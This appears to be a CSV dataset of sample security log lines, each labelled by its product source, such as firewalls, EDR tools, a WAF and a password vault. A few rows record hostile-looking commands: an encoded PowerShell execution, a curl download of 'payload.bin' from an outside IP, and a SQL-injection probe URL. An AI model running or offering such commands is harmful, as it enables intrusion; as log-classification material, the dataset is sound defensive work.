"type","log"
"auditd_exec","type=EXECVE pid=4821 uid=0 auid=1000 ses=12 comm=""curl"" exe=""/usr/bin/curl"" res=success"
"auditd_exec","type=EXECVE pid=311 uid=1000 auid=1000 ses=4 comm=""git"" exe=""/usr/bin/git"" res=success"
"auditd_exec","type=EXECVE pid=99871 uid=33 auid=4294967295 ses=8842 comm=""php-fpm"" exe=""/usr/sbin/php-fpm8.1"" res=failed"
"auditd_exec","type=EXECVE pid=52 uid=0 auid=0 ses=1 comm=""systemctl"" exe=""/usr/bin/systemctl"" res=success"
"checkpoint_fw","action=Accept src=10.2.4.18 dst=8.8.8.8 proto=udp service=53 rule=""DNS Out"" product=VPN-1"
"checkpoint_fw","action=Drop src=203.0.113.44 dst=10.2.4.80 proto=tcp service=22 rule=""Cleanup"" product=VPN-1"
"checkpoint_fw","action=Accept src=10.2.6.11 dst=142.250.72.14 proto=tcp service=443 rule=""Outbound Web"" product=VPN-1"
"checkpoint_fw","action=Reject src=198.51.100.7 dst=10.2.4.25 proto=tcp service=3389 rule=""Block RDP"" product=VPN-1"
"sophos_utm","severity=info sys=SecureNet sub=packetfilter name=""Packet dropped"" srcip=192.168.1.54 dstip=1.1.1.1 dstport=53"
"sophos_utm","severity=warn sys=SecureNet sub=packetfilter name=""Packet dropped"" srcip=192.168.4.9 dstip=45.33.32.156 dstport=23"
"sophos_utm","severity=info sys=SecureNet sub=packetfilter name=""Packet accepted"" srcip=10.8.0.6 dstip=172.16.0.4 dstport=8443"
"sophos_utm","severity=info sys=SecureWeb sub=http name=""web request blocked"" srcip=192.168.1.21 dstip=104.21.4.8 dstport=80"
"watchguard_fw","disp=Allow pri=4 policy=""HTTPS-proxy"" src_ip=10.0.1.22 dst_ip=52.4.1.9 pckt_len=60 proto=tcp"
"watchguard_fw","disp=Deny pri=2 policy=""Unhandled"" src_ip=185.220.101.4 dst_ip=10.0.1.5 pckt_len=44 proto=tcp"
"watchguard_fw","disp=Allow pri=4 policy=""DNS-forward"" src_ip=10.0.2.14 dst_ip=9.9.9.9 pckt_len=71 proto=udp"
"watchguard_fw","disp=Deny pri=1 policy=""Default"" src_ip=10.0.9.9 dst_ip=224.0.0.251 pckt_len=32 proto=igmp"
"cyberark_vault","act=Retrieve usr=svc_backup src=10.8.2.11 obj=""Root-Password"" reason=""Scheduled job"" station=PVWA01"
"cyberark_vault","act=Store usr=jhalvorsen src=10.8.4.2 obj=""Oracle-SYS"" reason=""Rotation"" station=PVWA02"
"cyberark_vault","act=Retrieve usr=mfarrell src=10.8.2.19 obj=""Domain-Admin"" reason=""Change request 4471"" station=PVWA01"
"cyberark_vault","act=Delete usr=admin src=10.8.1.1 obj=""Legacy-FTP"" reason=""Decommission"" station=PVWA03"
"carbonblack_edr","process=powershell.exe cmdline=""-enc SQBFAFgA"" user=CORP\jdoe hash=9f86d081884c7d65 hostname=WKS-0412"
"carbonblack_edr","process=rundll32.exe cmdline=""shell32.dll,Control_RunDLL"" user=CORP\bmoreau hash=2c26b46b68ffc68f hostname=WKS-1187"
"carbonblack_edr","process=curl.exe cmdline=""-o payload.bin http://203.0.113.9"" user=CORP\svc_scan hash=fcde2b2edba56bf4 hostname=SRV-EDGE02"
"carbonblack_edr","process=wmic.exe cmdline=""process list brief"" user=CORP\rlopez hash=8f14e45fceea167a hostname=WKS-0091"
"crowdstrike_event","event=ProcessRollup2 host=web-prod-11 sensor=7.18.17106 severity=high tactic=Execution technique=""Command and Scripting"""
"crowdstrike_event","event=DnsRequest host=db-core-01 sensor=7.18.17106 severity=low tactic=Discovery technique=""System Network Discovery"""
"crowdstrike_event","event=NetworkConnect host=jump-01 sensor=7.16.16211 severity=medium tactic=CommandAndControl technique=""Application Layer Protocol"""
"crowdstrike_event","event=ProcessRollup2 host=ci-runner-4 sensor=7.18.17110 severity=critical tactic=Persistence technique=""Scheduled Task"""
"proofpoint_filter","mod=mail cmd=env_from rule=pass id=g4NDlR8022475 ip=203.0.113.9 msgs=1"
"proofpoint_filter","mod=mail cmd=env_rcpt rule=quarantine id=b7XKmQ4418822 ip=198.51.100.4 msgs=3"
"proofpoint_filter","mod=session cmd=connect rule=reject id=c2PWnV1104471 ip=45.155.205.233 msgs=0"
"proofpoint_filter","mod=mail cmd=data rule=pass id=k9RTuA7733018 ip=203.0.113.88 msgs=2"
"barracuda_waf","unit=waf1 proto=HTTPS action=DENY url=""/login.php"" client=198.51.100.4 method=POST"
"barracuda_waf","unit=waf1 proto=HTTPS action=ALLOW url=""/api/v2/orders"" client=10.44.2.8 method=GET"
"barracuda_waf","unit=waf2 proto=HTTP action=DENY url=""/wp-admin/setup.php"" client=185.220.101.44 method=GET"
"barracuda_waf","unit=waf1 proto=HTTPS action=LOG url=""/checkout"" client=172.104.8.91 method=PUT"
"netscaler_appfw","profile=web_profile violation=APPFW_SQL url=""/search?q=1%27--"" client_ip=203.0.113.71 action_taken=blocked"
"netscaler_appfw","profile=web_profile violation=APPFW_XSS url=""/comment"" client_ip=198.51.100.22 action_taken=blocked"
"netscaler_appfw","profile=api_profile violation=APPFW_STARTURL url=""/internal/debug"" client_ip=10.99.4.3 action_taken=logged"
"netscaler_appfw","profile=web_profile violation=APPFW_FIELDFORMAT url=""/register"" client_ip=203.0.113.5 action_taken=transformed"
"zscaler_fw","user=mfarrell dept=Finance action=Allow proto=HTTPS sport=51442 dport=443 policy=""Default Firewall"""
"zscaler_fw","user=dnakamura dept=Engineering action=Block proto=SSH sport=40122 dport=22 policy=""No Outbound SSH"""
"zscaler_fw","user=bmoreau dept=Sales action=Allow proto=DNS sport=53311 dport=53 policy=""Default Firewall"""
"zscaler_fw","user=svc_sync dept=IT action=Allow proto=HTTPS sport=44821 dport=8443 policy=""Admin Tools"""
"juniper_srx","session=44821 reason=TCP_FIN src=10.1.1.4 dst=172.16.4.8 nat_src=203.0.113.2 application=junos-https"
"juniper_srx","session=1187 reason=idle_timeout src=10.1.2.9 dst=8.8.4.4 nat_src=203.0.113.2 application=junos-dns-udp"
"juniper_srx","session=99013 reason=TCP_RST src=10.1.4.41 dst=52.96.104.18 nat_src=203.0.113.3 application=junos-smtp"
"juniper_srx","session=310 reason=policy_deny src=192.168.8.14 dst=10.1.1.80 nat_src=0.0.0.0 application=junos-telnet"
"mikrotik_fw","chain=forward in_interface=ether1 out_interface=bridge src_mac=4C:5E:0C:11:22:33 len=52"
"mikrotik_fw","chain=input in_interface=ether2 out_interface=none src_mac=DC:2C:6E:44:81:0A len=40"
